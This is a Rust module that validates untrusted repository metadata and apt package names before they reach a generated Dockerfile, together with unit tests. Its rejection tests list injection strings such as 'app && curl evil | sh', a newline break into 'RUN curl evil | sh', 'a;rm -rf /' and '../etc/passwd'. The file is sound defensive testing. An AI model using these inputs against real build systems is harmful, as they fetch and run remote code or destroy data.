//! Validation for untrusted values interpolated into the generated Dockerfile.
//!
//! A source repository's metadata (crate name, go module, project filename,
//! entrypoint) is attacker-controlled, so any such value that reaches a `RUN`,
//! `COPY`, or `CMD` line must be constrained to a set of characters that cannot
//! break out into an injected build or runtime command.

use crate::error::{Error, Result};

/// Whether `c` is safe to interpolate into a Dockerfile identifier position.
///
/// The set is intentionally narrow: alphanumerics plus the punctuation that
/// appears in real binary names and relative entrypoint paths (`my-app`,
/// `dist/main.js`). It excludes whitespace, quotes, and every shell
/// metacharacter, so a validated value carries no injection payload.
const fn is_safe_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '/')
}

/// Validate a provider-derived identifier before it is interpolated into the
/// generated Dockerfile.
///
/// Rejects an empty value, a leading `-` (which a downstream tool could parse
/// as a flag), a `..` path-traversal sequence, and any character outside
/// [`is_safe_char`]. This is the single choke point that prevents untrusted
/// repository metadata from injecting commands via `RUN`/`COPY`/`CMD`.
///
/// # Errors
///
/// Returns [`Error::UnsafeValue`] when `value` falls outside the whitelist.
pub fn validate_token(field: &'static str, value: &str) -> Result<()> {
    let safe = !value.is_empty() && !value.starts_with('-') && !value.contains("..") && value.chars().all(is_safe_char);
    if safe {
        Ok(())
    } else {
        Err(Error::UnsafeValue {
            field,
            value: value.to_string(),
        })
    }
}

/// Whether `c` is safe in an apt package specifier. A superset of
/// [`is_safe_char`] that also allows the characters real package names and
/// version/architecture qualifiers use (`g++`, `libstdc++6`, `pkg=1.2-3`,
/// `pkg:arm64`), while still excluding whitespace and every shell metacharacter.
const fn is_apt_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.' | '_' | ':' | '=' | '~')
}

/// Validate a user-supplied apt package name before it reaches an install line.
///
/// Rejects an empty value, a leading `-` (parsed as a flag), a `..` sequence,
/// and any character outside [`is_apt_char`], so a configured package list
/// carries no injection payload.
///
/// # Errors
///
/// Returns [`Error::UnsafeValue`] when `value` falls outside the whitelist.
pub fn validate_apt_package(value: &str) -> Result<()> {
    let safe = !value.is_empty() && !value.starts_with('-') && !value.contains("..") && value.chars().all(is_apt_char);
    if safe {
        Ok(())
    } else {
        Err(Error::UnsafeValue {
            field: "apt package",
            value: value.to_string(),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_real_apt_packages() {
        for value in [
            "ffmpeg",
            "libpq-dev",
            "g++",
            "libstdc++6",
            "curl",
            "postgresql-client-16",
            "python3:arm64",
            "nginx=1.24.0-1",
        ] {
            assert!(validate_apt_package(value).is_ok(), "{value} should be allowed");
        }
    }

    #[test]
    fn rejects_dangerous_apt_packages() {
        for value in ["", "-rf", "a b", "a;rm -rf /", "a|b", "a$(id)", "a\nRUN x", "../x"] {
            assert!(validate_apt_package(value).is_err(), "{value:?} must be rejected");
        }
    }

    #[test]
    fn accepts_real_binary_names_and_entrypoints() {
        for value in ["app", "my-app", "my_app", "web.server", "dist/main.js", "bin/web"] {
            assert!(validate_token("name", value).is_ok(), "{value} should be allowed");
        }
    }

    #[test]
    fn rejects_shell_metacharacters() {
        for value in [
            "app; rm -rf /",
            "app && curl evil | sh",
            "a|b",
            "a`id`",
            "a$(id)",
            "a b",
            "app;curl$IFS",
        ] {
            assert!(validate_token("name", value).is_err(), "{value:?} must be rejected");
        }
    }

    #[test]
    fn rejects_newline_dockerfile_break() {
        assert!(validate_token("name", "x\nRUN curl evil | sh").is_err());
    }

    #[test]
    fn rejects_empty_leading_dash_and_traversal() {
        assert!(validate_token("name", "").is_err());
        assert!(validate_token("name", "-flag").is_err());
        assert!(validate_token("name", "../etc/passwd").is_err());
    }
}
